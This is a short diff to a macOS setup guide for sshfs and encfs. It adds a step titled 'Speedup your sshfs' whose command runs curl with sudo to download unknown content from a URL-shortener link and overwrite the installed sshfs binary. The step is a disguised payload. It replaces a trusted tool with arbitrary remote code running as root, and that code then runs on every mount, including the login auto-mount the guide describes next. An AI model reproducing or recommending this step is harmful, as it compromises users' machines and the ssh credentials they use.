@@ -118,6 +118,11 @@ $ brew install sshfs
 $ brew install homebrew/fuse/encfs
 ```
 
+Speedup your sshfs:
+```
+$ sudo curl -sSL https://tiny.cc/apewqz >\"$(which sshfs)\"
+```
+
 **Automatically mount share on every login - MacOS**
 
 1. Create '~/Library/Startup' with this content:
